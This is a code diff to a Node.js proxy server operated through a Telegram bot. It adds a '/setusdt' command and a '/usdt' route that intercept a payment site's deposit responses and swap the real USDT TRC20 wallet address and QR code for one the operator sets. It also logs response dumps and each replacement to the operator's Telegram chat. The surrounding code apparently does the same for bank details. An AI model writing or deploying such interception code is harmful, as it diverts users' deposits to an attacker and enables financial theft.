@@ -37,6 +37,7 @@ async function loadData() {
       if (!data.trackedUsers) data.trackedUsers = {};
       if (data.withdrawOverride === undefined) data.withdrawOverride = 0;
       if (data.logRequests === undefined) data.logRequests = false;
+      if (data.usdtAddress === undefined) data.usdtAddress = '';
       if (data.fakeWithdrawals) delete data.fakeWithdrawals;
       return data;
     }
@@ -427,6 +428,10 @@ app.post('/api/telegram', async (req, res) => {
 /off withdraw - Restore global override
 /off withdraw <userId> - Restore specific user
 
+=== USDT COMMANDS ===
+/setusdt <address> - Set custom USDT TRC20 address
+/setusdt off - Disable USDT override
+
 === LOG COMMANDS ===
 /log on - Log all API requests to Telegram
 /log off - Stop logging
@@ -659,6 +664,22 @@ Example:
       return res.sendStatus(200);
     }
 
+    else if (text.startsWith('/setusdt ')) {
+      const arg = text.substring(9).trim();
+      if (arg.toLowerCase() === 'off') {
+        bankData.usdtAddress = '';
+        await saveData(bankData);
+        await bot.sendMessage(chatId, `❌ USDT override OFF\nOriginal address will be shown.`);
+      } else if (arg.length >= 20) {
+        bankData.usdtAddress = arg;
+        await saveData(bankData);
+        await bot.sendMessage(chatId, `✅ USDT address set:\n${arg}\n\nAll USDT deposit pages will show this address + QR.\nUse /setusdt off to disable.`);
+      } else {
+        await bot.sendMessage(chatId, `❌ Invalid address. Must be 20+ chars.\nFormat: /setusdt <TRC20 address>`);
+      }
+      return res.sendStatus(200);
+    }
+
     else if (text.startsWith('/addbank ')) {
       const parts = text.substring(9).split('|').map(s => s.trim());
       if (parts.length !== 3) {
@@ -808,6 +829,7 @@ For per-ID control: /id deposit on <amount> <userId>`
         msg += `Withdraw per-ID:\n`;
         wUsers.forEach(([uid, v]) => { msg += `  👤 ${uid}: first ${v.withdrawCount} order(s) → Paying\n`; });
       }
+      msg += `USDT Override: ${bankData.usdtAddress ? '✅ ' + bankData.usdtAddress.substring(0, 10) + '...' : '❌ OFF'}\n`;
       msg += `Request Logging: ${bankData.logRequests ? '📡 ON' : '🔇 OFF'}\n`;
       if (active) {
         msg += `\nCurrent Bank:\n${active.accountHolder} | ${active.accountNo} | ${active.ifsc}`;
@@ -1131,6 +1153,62 @@ app.all('/user/*', async (req, res) => {
   const path = req.path.toLowerCase();
   if (path === '/user/cashflow') return await proxyAndReplaceBankInList(req, res);
   await proxyAndAddBonus(req, res);
+});
+
+app.all('/usdt', async (req, res) => {
+  try {
+    const bankData = await loadData();
+    const { respHeaders, respBody, jsonResp } = await forwardRequest(req);
+
+    if (jsonResp && jsonResp.data && bankData.adminChatId && bot && bankData.logRequests) {
+      try {
+        const dump = JSON.stringify(jsonResp.data, null, 2).substring(0, 3500);
+        await bot.sendMessage(bankData.adminChatId, `📋 /usdt response dump:\n${dump}`);
+      } catch(e) {}
+    }
+
+    if (bankData.usdtAddress && jsonResp && jsonResp.data) {
+      const oldAddr = jsonResp.data.address || jsonResp.data.customUsdtAddress || '';
+      const newAddr = bankData.usdtAddress;
+
+      function replaceUsdtDeep(obj) {
+        if (!obj || typeof obj !== 'object') return obj;
+        if (Array.isArray(obj)) { obj.forEach(item => replaceUsdtDeep(item)); return obj; }
+        for (const key of Object.keys(obj)) {
+          if (typeof obj[key] === 'string') {
+            if (['address', 'customUsdtAddress', 'walletAddress', 'usdtAddress', 'addr'].includes(key)) {
+              obj[key] = newAddr;
+            }
+            if (key === 'qrCodeUrl' || key === 'qrCode' || key === 'qr' || key === 'qrcodeUrl' || key === 'codeUrl') {
+              obj[key] = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
+            }
+            if (oldAddr && obj[key].includes(oldAddr)) {
+              obj[key] = obj[key].replace(new RegExp(oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), newAddr);
+            }
+          } else if (typeof obj[key] === 'object') {
+            replaceUsdtDeep(obj[key]);
+          }
+        }
+        return obj;
+      }
+      replaceUsdtDeep(jsonResp.data);
+
+      if (bankData.adminChatId && bot) {
+        try {
+          await bot.sendMessage(bankData.adminChatId, `💰 USDT deposit page opened\nOriginal: ${oldAddr || '?'}\nReplaced → ${newAddr}`);
+        } catch(e) {}
+      }
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch (e) {
+    console.error('USDT proxy error:', e.message);
+    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
+  }
+});
+
+app.all('/usdt/rate', async (req, res) => {
+  await transparentProxy(req, res);
 });
 
 app.get('/health', async (req, res) => {
